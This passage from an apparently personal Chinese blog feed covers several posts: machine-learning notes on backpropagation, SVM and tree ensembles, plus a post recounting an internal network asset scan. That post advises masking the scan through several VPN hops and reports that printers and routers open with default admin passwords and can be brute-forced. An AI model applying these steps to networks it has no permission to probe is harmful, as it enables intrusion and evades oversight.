alt="image-20201120110645932" style="zoom: 50%;"></li></ol><p><img src="https://img.dyngq.top/images/20201121214313.png" alt="image-20201120110600124" style="zoom:50%;"></p><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><ul><li><p>因为正向传播的缺点，所以要介绍反向传播的解决方式</p></li><li><p><img src="https://img.dyngq.top/images/20201122205931.png" alt="image-20201122203532108"></p></li><li><p>反向传播，从根传点往回传，每个结点内求和后继续传，直到叶结点停止，叶结点的值内求和即为梯度。</p></li><li><p>单个纯手推</p><ul><li><img src="https://img.dyngq.top/images/20201122154809.png" alt="image-20201121215151960"></li></ul></li><li><p>那么另外，为什么需要正向传播记录的中间变量，也就是一些中间输出值呢。</p><ul><li><a href="#图-6.2">图-6.2</a>中李宏毅老师表示的比较清楚，计算梯度需要两部分，${\frac{∂C_{}}{∂w_{}}}={\frac{∂z_{}}{∂w_{}}}*{\frac{∂C_{}}{∂z_{}}}$；其中第一部分${\frac{∂z_{}}{∂w_{}}}$是需要正向传播过程中计算并且记录的，推导一下的话也就是一些中间输出；第二部分${\frac{∂C_{}}{∂z_{}}}$才是反向传播中计算的。</li></ul></li><li><p>通用推导</p><ul><li></li></ul></li></ul><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><blockquote><p>训练的目的呢，就是要减小我们的训练误差，而误差呢，一般都是由自己定义或选择的一种函数，用来表示预测值与真实值之间的差距。</p></blockquote><h2 id="基于向量的反向传播"><a href="#基于向量的反向传播" class="headerlink" title="基于向量的反向传播"></a>基于向量的反向传播</h2><blockquote><p>基于标量的推到可能还算简单，但是真正运用到实际的向量运算中可能就有麻烦了。这里我们以CS231n的课后作业举例，其比较具有代表性。</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料  "></a>参考资料 <span id="ref"> </span></h2><ol><li><p><a href="https://www.zhihu.com/question/27239198/answer/43560763" target="_blank" rel="noopener">如何直观地解释 backpropagation 算法？ - YE Y的回答 - 知乎</a></p></li><li><p><a href="https://www.zhihu.com/question/36301367" target="_blank" rel="noopener">如何直观形象的理解方向导数与梯度以及它们之间的关系？</a></p></li><li><p><a href="https://www.zhihu.com/question/37024511" target="_blank" rel="noopener">∂x Δx dx？: 知乎</a></p></li><li><p>台大李宏毅！<a href="http://speech.ee.ntu.edu.tw/~tlkagk/index.html" target="_blank" rel="noopener">1. 李宏毅主页</a> <a href="https://youtu.be/ibJpTrp5mcE" target="_blank" rel="noopener">2. Youtube</a></p><p> <img src="https://img.dyngq.top/images/20201121214316.png" alt="image-20201119215307101" style="zoom:33%;"></p><p><img src="https://img.dyngq.top/images/20201121214318.png" alt="image-20201119213433039" style="zoom:33%;"><span id="图-6.2"> </span><img src="https://img.dyngq.top/images/20201121214321.png" alt="image-20201119211342321" style="zoom: 33%;"></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;深度学习基础；反向传播；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;手撕一下推导过程。&lt;/p&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
      <category term="CNN" scheme="http://www.dyngq.top/tags/CNN/"/>
    
  </entry>
  
  <entry>
    <title>一次内网资产扫描</title>
    <link href="http://www.dyngq.top/2020/11/17/20201117-%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E6%89%AB%E6%8F%8F/"/>
    <id>http://www.dyngq.top/2020/11/17/20201117-一次内网资源扫描/</id>
    <published>2020-11-17T08:40:00.000Z</published>
    <updated>2022-06-20T11:44:21.560Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>简单的扫描一下内网有没有可以资产，具体极其敏感的结果还是有的，但本文肯定不进行公布，只是记录。</p></blockquote><a id="more"></a><h2 id="0x00-工具-：-Advanced-IP-Scanner"><a href="#0x00-工具-：-Advanced-IP-Scanner" class="headerlink" title="0x00 工具 ： Advanced IP Scanner"></a>0x00 工具 ： Advanced IP Scanner</h2><p><img src="https://img.dyngq.top/images/20201117163257.png" alt="image-00"></p><h2 id="0x01-隐身策略"><a href="#0x01-隐身策略" class="headerlink" title="0x01 隐身策略"></a>0x01 隐身策略</h2><ul><li>尽量使用VPN进入，多跳几次更佳。</li></ul><h2 id="0x02-资源利用"><a href="#0x02-资源利用" class="headerlink" title="0x02 资源利用"></a>0x02 资源利用</h2><ul><li>像这种Web界面或者IP Scanner直接告知机型的设备，默认管理员密码就可以进入很多设备，而且一般都是最高权限。</li></ul><ol><li><p><strong>iR-ADV 6075</strong> 佳能打印机</p><ol><li><img src="https://img.dyngq.top/images/20201117163254.png" alt="image-01" style="zoom:75%;"></li><li><img src="https://img.dyngq.top/images/20201117163252.png" alt="image-02"></li></ol></li><li><p><img src="https://img.dyngq.top/images/20201117163250.png" alt="image-03"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163248.png" alt="image-04" style="zoom:50%;"></p></li><li><p><img src="https://img.dyngq.top/images/20201117111921.png" alt="image-04"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163243.png" alt="image-05"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163242.png" alt="image-06"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163240.png" alt="image-07"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163238.png" alt="image-08"></p></li><li><p>可爆破<img src="https://img.dyngq.top/images/20201117163237.png" alt="image-09"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163235.png" alt="image-10"><img src="https://img.dyngq.top/images/20201117163233.png" alt="image-20201117111457449"></p></li><li><p><img src="https://img.dyngq.top/images/20201117111909.png" alt="image-11"></p></li><li><p><img src="https://img.dyngq.top/images/20201117163230.png" alt="image-12"></p><p><img src="https://img.dyngq.top/images/20201117163228.png" alt="image-13"></p></li><li><p>用户名爆破<img src="https://img.dyngq.top/images/20201117163226.png" alt="image-14"></p></li><li><p>可爆破，无验证码及次数<img src="https://img.dyngq.top/images/20201117163224.png" alt="image-15"></p></li><li><p>用户名爆破<img src="https://img.dyngq.top/images/20201117163223.png" alt="image-16"></p></li><li><p>大多数是一些打印机之类的，一些路由器也都是直接默认弱密码，但是主要的网关防护都不错，比较统一。有一些摄像头或者资料等敏感性太强，无法上传；我本人是很震撼的，以至于我也不敢再继续探测下去了；信息安全在如今已经经常被提起和注意了，但是还是存在诸多诸多的问题。信息安全，刻不容缓啊。</p></li></ol><h2 id="0x03-思考"><a href="#0x03-思考" class="headerlink" title="0x03 思考"></a>0x03 思考</h2><ul><li>很多截图没法上传，本文章仅作为警示作用，所有截图都已确认脱敏。</li><li>暴露的资产一般是一些比较老旧的资源，和低价值的打印机之类的。这可能与近些年来信息安全意识逐步提高有关系。不过同时也存在着一些高危漏洞，极高风险的。</li><li>只要是暴露在网络环境中的资产，不管是公网还是局域网，都应该做好防护，关闭不必要的端口，是用强密码。避免使用弱密码。</li><li>据爆料某手机公司刚刚公司内网被映射，很可怕。</li><li>另外，很多网络摄像头直接映射到公网，而且还是弱密码，一定注意信息安全呀。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.advanced-ip-scanner.com/cn/" target="_blank" rel="noopener">Advanced-Ip-Scanner</a></li><li><a href="https://www.jianshu.com/p/7411c38b0927" target="_blank" rel="noopener">利用ZoomEye快速查找Hikvision网络摄像头</a></li><li><a href="https://www.cnblogs.com/yyxianren/p/12448235.html" target="_blank" rel="noopener">CVE-2018-18778 mini_httpd任意文件读取漏洞</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;简单的扫描一下内网有没有可以资产，具体极其敏感的结果还是有的，但本文肯定不进行公布，只是记录。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Sec" scheme="http://www.dyngq.top/categories/Sec/"/>
    
    
      <category term="Sec" scheme="http://www.dyngq.top/tags/Sec/"/>
    
      <category term="Advanced IP Scanner" scheme="http://www.dyngq.top/tags/Advanced-IP-Scanner/"/>
    
  </entry>
  
  <entry>
    <title>手推SVM</title>
    <link href="http://www.dyngq.top/2020/11/12/20201112-%E6%89%8B%E6%8E%A8SVM/"/>
    <id>http://www.dyngq.top/2020/11/12/20201112-手推SVM/</id>
    <published>2020-11-11T16:00:01.000Z</published>
    <updated>2022-06-20T11:44:21.559Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>间隔；对偶；核技巧；</strong></p><p>手推SVM；</p><p>整里SVM相关问题；</p></blockquote><a id="more"></a><p><strong>Large-Margin Linear Classification</strong></p><p><strong>最大间隔线性分类器</strong></p><p><strong>决策函数</strong>为 <strong>$f(x) = sign(\omega^{<em>}x+b^{</em>})$</strong></p><p>推导过程因为本人写字习惯斜着，所以比较乱。对此表示抱歉。附录里会放一张整体的推导过程图片，比较清晰。</p><p><a href="#wholeimage">整体推导图</a></p><h2 id="0x01-间隔"><a href="#0x01-间隔" class="headerlink" title="0x01 间隔"></a>0x01 间隔</h2><h3 id="1-1-硬间隔"><a href="#1-1-硬间隔" class="headerlink" title="1-1 硬间隔"></a>1-1 硬间隔</h3><p>基本硬间隔的优化表示</p><p><img src="https://img.dyngq.top/images/20210304160910.png" alt="image-20210304160908917"></p><p>展开</p><p><img src="https://img.dyngq.top/images/20210304165036.png" alt="image-20210304165031720"></p><p>将后边部分缩放为1，再经过变形之后得到：</p><p><img src="https://img.dyngq.top/images/20210304165304.png" alt="image-20210304165205054"></p><p>整理一下，原问题为：</p><p><img src="https://img.dyngq.top/images/20210304165307.png" alt="image-20210304165231998" style="zoom: 80%;"></p><p>带约束的不好优化，所以引入拉格朗日乘子<span id="la"> </span></p><p><img src="https://img.dyngq.top/images/20210304165356.png" alt="image-20210304165354347" style="zoom: 50%;"></p><p>原问题就没有了w,b的约束，再因为原问题具有<strong>强对偶性</strong>，求解原问题等价于求解对偶问题，所以转化为对偶问题</p><p><img src="https://img.dyngq.top/images/20210304165611.png" alt="image-20210304165607819" style="zoom:50%;"></p><p>下一步，利用凸优化的特性求解最小化的拉格朗如对偶问题</p><p><img src="https://img.dyngq.top/images/20210304165755.png" alt="image-20210304165740781" style="zoom:67%;"></p><p>得到</p><p><img src="https://img.dyngq.top/images/20210304165757.png" alt="image-20210304165753233" style="zoom:67%;"></p><p>最后结合KKT条件解除最终解</p><p><img src="https://img.dyngq.top/images/20210304165855.png" alt="image-20210304165852279"></p><h3 id="1-2-软间隔"><a href="#1-2-软间隔" class="headerlink" title="1-2 软间隔"></a>1-2 软间隔</h3><p>由于很多情况下数据集中存在噪声等情况，无法求解到最终解，所以引入了含有噪声的优化函数。</p><p><img src="https://img.dyngq.top/images/20210304170647.png" alt="image-20210304170526706"></p><ul><li><p>Quadratic Programming <strong>二次规划问题</strong></p></li><li><p>SVM的分类结果只与支持向量有关，除了支持向量以外，其他的系数均为0. 这也是SVM高效的原因。</p></li></ul><h2 id="0x02-拉格朗日对偶性"><a href="#0x02-拉格朗日对偶性" class="headerlink" title="0x02 拉格朗日对偶性"></a>0x02 拉格朗日对偶性</h2><p>目的在于不求解带有约束的原问题，通过引入拉格朗日乘子的方式来直接求解。第一节中已经说明，从<a href="#la">label</a>处开始。</p><h2 id="0x03-核技巧"><a href="#0x03-核技巧" class="headerlink" title="0x03 核技巧"></a>0x03 核技巧</h2><p>把输入数据<strong>映射</strong>到一个新的(更<strong>高维</strong>)的特征空间，本质思想类似于加入<strong>非线性</strong></p><p>具体实现在于将原公式中的内积替换成<strong>核函数</strong></p><p><img src="https://img.dyngq.top/images/20210303171622.png" alt="image-20210303171620564" style="zoom: 25%;"></p><p><strong>RBF</strong></p><p><img src="https://img.dyngq.top/images/20210303174004.png" alt="image-20210303174002791" style="zoom:25%;"></p><h2 id="0x04-SMO-序列最小化优化"><a href="#0x04-SMO-序列最小化优化" class="headerlink" title="0x04 SMO 序列最小化优化"></a>0x04 SMO 序列最小化优化</h2><p>QP问题最坏时间复杂度为$O(N_{3})$，我们要做的就是利用优化算法尽量避免最坏时间复杂度。</p><p>将原N的参数的问题分解为2个2个的子问题，直到全部满足KKT条件为止。</p><p>因为子问题存在解析解，所以就算子问题很多，整体上也是加速效果。</p><p><img src="https://img.dyngq.top/images/20210303180741.png" alt="image-20210303180740172" style="zoom:33%;"></p><p>合页损失，随机SVM</p><p>合页损失 hinge loss，看起来比较像relu，$max{0, 1-y_{i}(\omega·x+b)}$</p><p><img src="https://img.dyngq.top/images/20210312150121.png" alt="image-20210303191721173"><img src="https://img.dyngq.top/images/20210312150144.png" alt="image-20210303191729994"><img src="https://img.dyngq.top/images/20210312150140.png" alt="image-20210303191738649"></p><p><img src="https://img.dyngq.top/images/20210312150136.png" alt="image-20210303191801718"></p><p>最后这一部分比较乱，大体理解SMO思想即可。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.bilibili.com/video/BV1oJ411U7Y8?p=4" target="_blank" rel="noopener">猫都能看懂的SVM【从概念理解、优化方法到代码实现】</a></li><li><a href="https://www.bilibili.com/video/BV1Hs411w7ci?p=4&amp;t=8" target="_blank" rel="noopener">机器学习-白板推导系列(六)-支持向量机SVM（Support Vector Machine）</a></li><li></li></ol><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><span id="wholeimage">整体推导过程</span></p><p><img src="https://img.dyngq.top/images/20210304170729.png" alt="image-20210304170727875"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;间隔；对偶；核技巧；&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;手推SVM；&lt;/p&gt;
&lt;p&gt;整里SVM相关问题；&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>My First SCI - An Intrusion Detection Method Based on Decision Tree-Recursive Feature Elimination in Ensemble Learning</title>
    <link href="http://www.dyngq.top/2020/10/23/20201023-My%20First%20SCI%20-%20An%20Intrusion%20Detection%20Method%20Based%20on%20Decision%20Tree-Recursive%20Feature%20Elimination%20in%20Ensemble%20Learning/"/>
    <id>http://www.dyngq.top/2020/10/23/20201023-My First SCI - An Intrusion Detection Method Based on Decision Tree-Recursive Feature Elimination in Ensemble Learning/</id>
    <published>2020-10-22T16:00:01.000Z</published>
    <updated>2022-06-20T11:44:21.559Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://doi.org/10.1155/2020/2835023；" target="_blank" rel="noopener">https://doi.org/10.1155/2020/2835023；</a></p></blockquote><a id="more"></a><p>An Intrusion Detection Method Based on Decision Tree-Recursive Feature Elimination in Ensemble Learning</p><p><a href="https://doi.org/10.1155/2020/2835023" target="_blank" rel="noopener">https://doi.org/10.1155/2020/2835023</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://doi.org/10.1155/2020/2835023；&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://doi.org/10.1155/2020/2835023；&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="AI" scheme="http://www.dyngq.top/categories/AI/"/>
    
    
      <category term="AI" scheme="http://www.dyngq.top/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>从决策树，随机森林，到XGBoost</title>
    <link href="http://www.dyngq.top/2020/10/01/20201001-%E4%BB%8E%E5%86%B3%E7%AD%96%E6%A0%91%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97%EF%BC%8C%E5%88%B0XGBoost/"/>
    <id>http://www.dyngq.top/2020/10/01/20201001-从决策树，随机森林，到XGBoost/</id>
    <published>2020-09-30T16:00:01.000Z</published>
    <updated>2022-06-20T11:44:21.559Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>树类模型的发展与总结</p></blockquote><a id="more"></a><h2 id="0x01-决策树"><a href="#0x01-决策树" class="headerlink" title="0x01 决策树"></a>0x01 决策树</h2><h3 id="1-1-整体技术"><a href="#1-1-整体技术" class="headerlink" title="1-1 整体技术"></a>1-1 整体技术</h3><p>根据条件概率分布——<strong>判别</strong>模型</p><p>本质在于归纳出一组分类规则</p><p>求解方法一般为正则化的极大似然函数</p><p>决策树生成方法为<strong>递归的选择最优特征</strong></p><p><strong>过拟合</strong>-<strong>剪枝</strong> <a href="#1-3 剪枝">—&gt; 1-3 剪枝</a></p><ol><li>特征选择</li><li>决策树的生成</li><li>剪枝</li></ol><h3 id="1-1-需要用到的公式"><a href="#1-1-需要用到的公式" class="headerlink" title="1-1 需要用到的公式"></a>1-1 需要用到的公式</h3><p>假设随机变量X的概率分布为</p><script type="math/tex; mode=display">P(X = x_{i}) = p_{i}, i = 1,2,...,n</script><p>假设有随机变量(X, Y)，其联合概率分布为</p><script type="math/tex; mode=display">P(X = x_{i}, Y = y_{i}) = p_{ij}, i = 1,2,...,n; j = 1,2,...,m</script><p><strong>熵</strong> </p><p>表示随机变量不确定性的程度</p><script type="math/tex; mode=display">H(X) = -\sum_{i = 1}^{n}p_{i}log_{2}{p_{i}}</script><script type="math/tex; mode=display">H(X) = -\sum_{i = 1}^{n}p_{i}log_{e}{p_{i}}</script><p>以<strong>2</strong>为底，最后单位为<strong>bit</strong>；以<strong>e</strong>为底，最后单位为<strong>nat</strong>；</p><p>熵与X的值无关，而与X的分布有关，所以可以记为</p><script type="math/tex; mode=display">H(X) = -\sum_{i = 1}^{n}p_{i}log_{2}{p_{i}}</script><p><strong>条件熵</strong></p><script type="math/tex; mode=display">H(Y|X) = \sum_{i = 1}^{n}p_{i}H(Y|X = x_{i})</script><p>经验熵和经验条件熵就是当熵和条件熵中的概率是由数据估计得到时，对应的熵和条件熵</p><p><strong>经验熵</strong></p><p>假设数据集为D，$|C_{k}|$表示第k类的样本数</p><script type="math/tex; mode=display">H(D) = \sum_{k = 1}^{K}\frac{|C_{k}|}{|D|}log_{2}{\frac{|C_{k}|}{|D|}}</script><p><strong>经验条件熵</strong></p><p>$D_{i}$表示因为特征A所划分的数据子集，$|D_{ik}|$表示$|D_{i}|$中属于第k类的数量</p><script type="math/tex; mode=display">H(D|A) = \sum_{i = 1}^{n}\frac{|D_{i}|}{|D|}\sum_{k = 1}^{K}\frac{|D_{ik}|}{|D|}log_{2}{\frac{|D_{ik}|}{|D|}}</script><p><strong>信息增益</strong></p><p>信息增益表示<strong>得知X的概率使得对Y的不确定性的减小程度</strong></p><script type="math/tex; mode=display">g(D,A) = H(D) - H(D|A)</script><p><strong>信息增益比</strong></p><script type="math/tex; mode=display">g_{R}(D,A) = \frac{g(D,A)}{H(D)}</script><p><strong>基尼指数</strong></p><script type="math/tex; mode=display">Gini(p) = \sum_{k = 1}^{n}p_{k}(1-p_{k}) = \sum_{k = 1}^{n}1-p_{k}^{2}</script><script type="math/tex; mode=display">Gini(D) = \sum_{k = 1}^{n}1-{\frac{|C_{k}|}{|D|}}^{2}</script><p><strong>条件基尼指数</strong></p><script type="math/tex; mode=display">Gini(D) = \sum_{k=1}^{K}\frac{|D_{k}|}{|D|}Gini(D_{k})</script><script type="math/tex; mode=display">Gini(D, A) = Gini(D | A) = \frac{|D_{1}|}{|D|}Gini(D_{1})+\frac{|D_{2}|}{|D|}Gini(D_{2})</script><h3 id="1-2-ID3-C4-5-CART"><a href="#1-2-ID3-C4-5-CART" class="headerlink" title="1-2 ID3 C4.5 CART"></a>1-2 ID3 C4.5 CART</h3><p>ID3算法 选择<strong>信息增益</strong>最大的特征作为节点的特征，由该特征的不同取值建立子节点，再对子节点循环调用</p><p>ID3相当于用极大似然法进行概率模型的选择</p><p>C4.5是ID3的改进，使用信息增益比</p><p>这两种算法只有生成，没有剪枝，容易过拟合</p><p>需要<strong>预剪枝</strong> <a href="#1-3 剪枝">—&gt; 1-3 剪枝</a></p><p>剪枝使用损失函数来进行，考虑决策树的复杂度</p><p>CART算法 classification and regression tree</p><p>先生成尽可能大的决策树（完全生长），用验证集进行剪枝并选择最优子树</p><p>基尼指数</p><p>计算每种特征及特征中每种取值下的基尼指数，例如 $A$ 特征下 $a_{1},a_{2},…,a_{A}$</p><p>计算量变大了</p><p>结束条件</p><ol><li>样本数量小于阈值</li><li>样本集基尼指数小于阈值（样本集中样本基本属于同一类）</li><li>没有更多特征</li></ol><h3 id="1-3-CART回归"><a href="#1-3-CART回归" class="headerlink" title="1-3 CART回归"></a>1-3 CART回归</h3><p>回归需要特别拿出来说要下，因为其他两个只能进行分类</p><p>cart可以实现<strong>最小二乘回归树</strong></p><p>采用<strong>平方损失</strong></p><h3 id="1-4-剪枝"><a href="#1-4-剪枝" class="headerlink" title="1-4 剪枝"></a>1-4 剪枝</h3><p><strong>后剪枝</strong> CART</p><p>一般采用递归的方式</p><p>$g(t)=\frac{C(t)-C(T_{t})}{\left|t\right|-1}$</p><p>$T_{0}$中减去g(t)值最小的子树$T_{t}$就为$T_{1}$，这个最小的g(t)就为$\alpha_{1}$，之后不断剪枝，$\alpha$不断增大，就获得了$\alpha$区间和子树集合。</p><p>下一步利用交叉验证选取最好的子树，这一过程也就选择了最好的$\alpha$</p><p><strong>预剪枝</strong> ID3 C4.5</p><h2 id="0x02-集成学习"><a href="#0x02-集成学习" class="headerlink" title="0x02 集成学习"></a>0x02 集成学习</h2><blockquote><ol><li><strong>找到误差互相独立的基分类器</strong></li><li><strong>训练基分类器</strong></li><li><strong>合并基分类器的结果</strong></li></ol></blockquote><h3 id="2-0-偏差-方差"><a href="#2-0-偏差-方差" class="headerlink" title="2-0 偏差 方差"></a>2-0 偏差 方差</h3><p><strong>偏差</strong></p><ul><li><strong>偏差</strong>是指由有所采样得到的大小为m的训练数据集，训练出的所有模型的输出的平均值真实模型输出之间的偏差；</li></ul><p><strong>方差</strong></p><ul><li><strong>方差</strong>是指有所有采样得到的大小为m的训练数据集，训练出的所有模型的输出的方差；</li></ul><h3 id="2-1-Boosting"><a href="#2-1-Boosting" class="headerlink" title="2-1 Boosting"></a>2-1 Boosting</h3><p>串行，对上层分类错误的样本，基于更高的权重。</p><p>最后的结果采用各层输出的加权结果</p><p>目的在于缩小偏差</p><h3 id="2-2-Bagging"><a href="#2-2-Bagging" class="headerlink" title="2-2 Bagging"></a>2-2 Bagging</h3><p>并行</p><p>样本集分离子样本集，最终基分类器投票</p><p>目的在于缩小方差</p><h3 id="2-3-Stacking"><a href="#2-3-Stacking" class="headerlink" title="2-3 Stacking"></a>2-3 Stacking</h3><p>之前写过专门介绍stacking的文章：<a href="https://dyngq.top/2019/07/21/20190721-%E6%A8%A1%E5%9E%8B%E8%9E%8D%E5%90%88%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%89%EF%BC%89stacking/" target="_blank" rel="noopener">Stacking 模型融合</a></p><h2 id="0x02-Adaboost"><a href="#0x02-Adaboost" class="headerlink" title="0x02 Adaboost"></a>0x02 Adaboost</h2><p>以ID3决策树为例，其实什么基分类器都可以；不过树形结构简单、且比较容易产生随机结果。</p><p>Adaboost采用<strong>前向分步算法</strong>，通俗理解也就是串行思想，逐步优化基分类器；</p><ol><li>在当前数据集的权重分布情况下，训练基分类器；</li><li>计算错误率</li><li>根据错误率更新样本权重</li></ol><p>训练误差是指数级下降的；</p><p>不需要考虑误差下界，AdaBoost具有适应性，也就是名字里的adaptive；</p><h2 id="0x03-GDBT"><a href="#0x03-GDBT" class="headerlink" title="0x03 GDBT"></a>0x03 GDBT</h2><p>GBDT主要的优点有：</p><ul><li><ul><li>1) 可以灵活处理各种类型的数据，包括连续值和离散值。</li><li>2) 在相对少的调参时间情况下，预测的准确率也可以比较高。这个是相对SVM来说的。</li><li>3）使用一些健壮的损失函数，对异常值的鲁棒性非常强。比如 Huber损失函数和Quantile损失函数。</li></ul></li><li><p>from百面机器学习：</p></li><li><ul><li><ul><li>预测阶段计算速度较快，树与树之间可以并行化计算</li><li>在分布稠密的数据机上，泛化能力和表达能力都比较好</li><li>具有较好的解释性和鲁棒性</li><li>能够自动发现特征质检的高阶关系</li><li>不需要做特殊预处理（比如归一化）</li></ul></li></ul></li></ul><p>GBDT的主要缺点有：</p><ul><li><ul><li>由于弱学习器之间存在依赖关系，难以并行训练数据。不过可以通过自采样的SGBT来达到部分并行。</li><li>在高维稀疏数据上，表现不如SVM或神经网络</li><li>在处理文本分类特征问题上，相对其他模型优势不如在处理数值特征时明显</li><li>训练过程需要串行，只能在决策树内部采用一些局部并行手段提高训练速度</li></ul></li></ul><h2 id="0x04-XGBoost"><a href="#0x04-XGBoost" class="headerlink" title="0x04 XGBoost"></a>0x04 XGBoost</h2><p>XGBoost是GDBT的工程实现，</p><p>主要改进：</p><ol><li>数学上：<ul><li>二阶泰勒展开</li><li>正则化项</li></ul></li><li>工程上：<ul><li>训练阶段中树的分裂阶段可以并行</li><li>可以处理缺失值</li></ul></li></ol><p><img src="https://img.dyngq.top/images/20210311192912.png" alt="image-20210311192859008"></p><p><img src="https://img.dyngq.top/images/20210313204857.png" alt="image-20210313204852451" style="zoom: 80%;"></p><ul><li><strong>适用于树模型的正则项</strong></li><li>包含了输的叶子节点个数、每个叶子节点输出分数的L2平方和<ul><li>正则化项γ起到了一定的预剪枝的效果</li><li>xgboost采用预剪枝策略，只有分裂后的增益大于0才会进行分裂。</li></ul></li><li><strong>缺失值</strong><ul><li>XGBoost 在构建树的节点过程中只考虑非缺失值的数据遍历，而为每个节点增加了一个缺省方向，当样本相应的特征值缺失时，可以被归类到缺省方向上，最优的缺省方向可以从数据中学到。至于如何学到缺省值的分支，其实很简单，分别枚举特征缺省的样本归为左右分支后的增益，选择增益最大的枚举项即为最优缺省方向。</li><li>在构建树的过程中需要枚举特征缺失的样本，乍一看该算法的计算量增加了一倍，但其实该算法在构建树的过程中只考虑了特征未缺失的样本遍历，而特征值缺失的样本无需遍历只需直接分配到左右节点，故算法所需遍历的样本量减少，稀疏感知算法比 basic 算法速度块了超过 50 倍。</li></ul></li><li><strong>抽样</strong></li><li><ul><li><strong>列抽样</strong>（column subsampling）。xgboost借鉴了随机森林的做法，支持列抽样（即每次的输入特征不是全部特征），不仅能降低过拟合，还能减少计算，这也是xgboost异于传统gbdt的一个特性。</li><li><strong>行抽样</strong>：传统GBDT在每轮迭代时使用全部的数据；XGB则采用了类似RF的策略，支持对数据进行采样</li></ul></li><li><strong>并行化处理</strong>：</li><li><ul><li>在训练之前，预先对每个特征内部进行了排序找出候选切割点，然后保存为block结构，后面的迭代中重复地使用这个结构，大大减小计算量。</li><li>在进行<strong>节点的分裂</strong>时，需要计算每个特征的增益，最终选增益最大的那个特征去做分裂，那么各个特征的增益计算就可以开多线程进行，即在不同的特征属性上采用多线程并行方式寻找最佳分割点。</li></ul></li><li><p>参数</p><ul><li><p>XGB架构参数</p></li><li><ul><li><p>booster：CART、或者线性模型、或者DART</p></li><li><p>n_estimator：</p></li><li><p>objective：</p></li><li><ul><li>分类：MSE</li><li>分类：二分类用logistic、多分类用softma</li></ul></li></ul></li><li><p>弱学习器参数</p></li><li><ul><li>max_depth：树的深度</li><li>min_child_weight：最小子节点的权重。如果某个子节点权重小于这个阈值，则不会在分裂。使用的是该节点所有二阶导数的和</li><li>gamma：分裂所带来的损失最小阈值，大于此值，才能继续分裂</li><li>subsample：子采样参数，无放回抽样</li><li>colsample_bytree 整棵树的特征采样比例</li><li>colsample_bylevel 某层的特征采样比例</li><li>colsample_bynode 某一个树节点的特征采样比例</li><li>reg_alpha：L1正则化参数</li><li>reg_lambda： L2正则化参数</li></ul></li></ul></li></ul><ul><li><ul><li><ul><li><p>其他</p></li><li><ul><li><p>n_jobs控制算法的并发线程数</p></li><li><p>scale_pos_weight用于类别不平衡的时候，负例和正例的比例。类似于sklearn中的class_weight</p></li><li><p>importance_type则可以查询各个特征的重要性程度。最后可以通过调用booster的get_score方法获取对应的特征权重。</p></li><li><ul><li>“weight”通过特征被选中作为分裂特征的计数来计算重要性</li><li>“gain”和“total_gain”则通过分别计算特征被选中做分裂特征时带来的平均增益和总增益来计算重要性</li><li>“cover”和 “total_cover”通过计算特征被选中做分裂时的平均样本覆盖度和总体样本覆盖度来来计算重要性。</li></ul></li></ul></li></ul></li></ul></li><li><p><strong>Shrinkage（缩减）</strong>，相当于学习速率（xgboost中的eta）。每次迭代，增加新的模型，在前面成上一个小于1的系数，降低优化的速度，每次走一小步逐步逼近最优模型比每次走一大步逼近更加容易避免过拟合现象；</p></li></ul><h2 id="0x05-LightGBM"><a href="#0x05-LightGBM" class="headerlink" title="0x05 LightGBM"></a>0x05 LightGBM</h2><p>LightGBM 由微软提出，主要用于解决 GDBT 在海量数据中遇到的问题，以便其可以更好更快地用于工业实践中。</p><p>从 LightGBM 名字我们可以看出其是轻量级（Light）的梯度提升机（GBM），其相对 XGBoost 具有训练速度快、内存占用低的特点。</p><ol><li>单边梯度抽样算法；</li><li>直方图算法；</li><li>互斥特征捆绑算法；</li><li>基于最大深度的 Leaf-wise 的垂直生长算法；</li><li>类别特征最优分割；</li><li>特征并行和数据并行；</li><li>缓存优化。</li></ol><h3 id="LightGBM与-XGBoost-的对比"><a href="#LightGBM与-XGBoost-的对比" class="headerlink" title="LightGBM与 XGBoost 的对比"></a>LightGBM与 XGBoost 的对比</h3><p>本节主要总结下 LightGBM 相对于 XGBoost 的优点，从内存和速度两方面进行介绍。</p><p><strong>内存更小</strong></p><ol><li>123</li><li>XGBoost 使用预排序后需要记录特征值及其对应样本的统计值的索引，而 